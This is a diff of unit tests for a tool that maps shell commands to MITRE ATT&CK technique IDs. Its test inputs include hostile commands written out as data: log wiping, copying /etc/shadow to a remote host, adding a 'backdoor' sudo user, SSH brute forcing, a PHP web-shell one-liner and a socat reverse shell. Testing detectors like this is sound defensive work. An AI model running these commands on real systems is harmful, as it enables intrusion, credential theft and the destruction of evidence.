@@ -116,3 +116,166 @@ class TestMapCommand:
     def test_whitespace_only(self):
         mid, name = map_command('   ')
         assert mid is None
+
+    # ── Defense Evasion ───────────────────────────────────────────────────────
+    def test_shred(self):
+        mid, _ = map_command('shred -u /var/log/auth.log')
+        assert mid == 'T1070.002'
+
+    def test_truncate(self):
+        mid, _ = map_command('truncate -s 0 /var/log/syslog')
+        assert mid == 'T1070.002'
+
+    def test_history(self):
+        mid, _ = map_command('history -c')
+        assert mid == 'T1070.003'
+
+    def test_unset(self):
+        mid, _ = map_command('unset HISTFILE')
+        assert mid == 'T1070.003'
+
+    # ── Discovery ─────────────────────────────────────────────────────────────
+    def test_uname(self):
+        mid, _ = map_command('uname -a')
+        assert mid == 'T1082'
+
+    def test_hostname(self):
+        mid, _ = map_command('hostname')
+        assert mid == 'T1082'
+
+    def test_ps(self):
+        mid, _ = map_command('ps aux')
+        assert mid == 'T1057'
+
+    def test_netstat(self):
+        mid, _ = map_command('netstat -tulnp')
+        assert mid == 'T1049'
+
+    def test_ss(self):
+        mid, _ = map_command('ss -anp')
+        assert mid == 'T1049'
+
+    def test_ifconfig(self):
+        mid, _ = map_command('ifconfig')
+        assert mid == 'T1016'
+
+    def test_ip(self):
+        mid, _ = map_command('ip addr show')
+        assert mid == 'T1016'
+
+    def test_find(self):
+        mid, _ = map_command('find / -name "*.conf"')
+        assert mid == 'T1083'
+
+    def test_nmap(self):
+        mid, _ = map_command('nmap -sV 192.168.1.0/24')
+        assert mid == 'T1046'
+
+    def test_masscan(self):
+        mid, _ = map_command('masscan -p80 10.0.0.0/8')
+        assert mid == 'T1046'
+
+    # ── Lateral Movement / Exfiltration ───────────────────────────────────────
+    def test_ssh(self):
+        mid, _ = map_command('ssh root@10.0.0.5')
+        assert mid == 'T1021.004'
+
+    def test_scp(self):
+        mid, _ = map_command('scp /etc/shadow root@10.0.0.5:/tmp/')
+        assert mid == 'T1048'
+
+    def test_rsync(self):
+        mid, _ = map_command('rsync -avz /data/ root@10.0.0.5:/exfil/')
+        assert mid == 'T1048'
+
+    def test_ftp(self):
+        mid, _ = map_command('ftp 10.0.0.5')
+        assert mid == 'T1048'
+
+    def test_sftp(self):
+        mid, _ = map_command('sftp user@10.0.0.5')
+        assert mid == 'T1048'
+
+    # ── Archive / Staging ─────────────────────────────────────────────────────
+    def test_tar(self):
+        mid, _ = map_command('tar czf /tmp/data.tgz /home/')
+        assert mid == 'T1560.001'
+
+    def test_zip(self):
+        mid, _ = map_command('zip -r /tmp/out.zip /home/')
+        assert mid == 'T1560.001'
+
+    def test_gzip(self):
+        mid, _ = map_command('gzip /tmp/dump.sql')
+        assert mid == 'T1560.001'
+
+    def test_base64(self):
+        mid, _ = map_command('base64 /etc/shadow')
+        assert mid == 'T1132.001'
+
+    # ── Persistence ───────────────────────────────────────────────────────────
+    def test_useradd(self):
+        mid, _ = map_command('useradd -m backdoor')
+        assert mid == 'T1136.001'
+
+    def test_adduser(self):
+        mid, _ = map_command('adduser backdoor')
+        assert mid == 'T1136.001'
+
+    def test_usermod(self):
+        mid, _ = map_command('usermod -aG sudo backdoor')
+        assert mid == 'T1098'
+
+    # ── Credential Access ─────────────────────────────────────────────────────
+    def test_john(self):
+        mid, _ = map_command('john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt')
+        assert mid == 'T1110.002'
+
+    def test_hashcat(self):
+        mid, _ = map_command('hashcat -m 1800 hash.txt wordlist.txt')
+        assert mid == 'T1110.002'
+
+    def test_hydra(self):
+        mid, _ = map_command('hydra -l root -P pass.txt ssh://10.0.0.5')
+        assert mid == 'T1110.001'
+
+    # ── Execution (additional interpreters) ───────────────────────────────────
+    def test_perl(self):
+        mid, _ = map_command('perl -e "use Socket;..."')
+        assert mid == 'T1059'
+
+    def test_ruby(self):
+        mid, _ = map_command('ruby exploit.rb')
+        assert mid == 'T1059'
+
+    def test_php(self):
+        mid, _ = map_command('php -r "system($_GET[cmd]);"')
+        assert mid == 'T1059'
+
+    def test_socat(self):
+        mid, _ = map_command('socat TCP:10.0.0.5:4444 EXEC:/bin/bash')
+        assert mid == 'T1071'
+
+    # ── Full path stripping works for new commands ─────────────────────────────
+    def test_full_path_useradd(self):
+        mid, _ = map_command('/usr/sbin/useradd -m backdoor')
+        assert mid == 'T1136.001'
+
+    def test_full_path_nmap(self):
+        mid, _ = map_command('/usr/bin/nmap -sV 10.0.0.0/24')
+        assert mid == 'T1046'
+
+
+class TestMapEventExtended:
+    def test_service_stopped(self):
+        mid, name = map_event('Service Stopped')
+        assert mid == 'T1489'
+        assert 'Service Stop' in name
+
+    def test_service_started_unchanged(self):
+        mid, name = map_event('Service Started')
+        assert mid == 'T1543.002'
+
+    def test_web_shell_unchanged(self):
+        mid, _ = map_event('Web Shell')
+        assert mid == 'T1505.003'
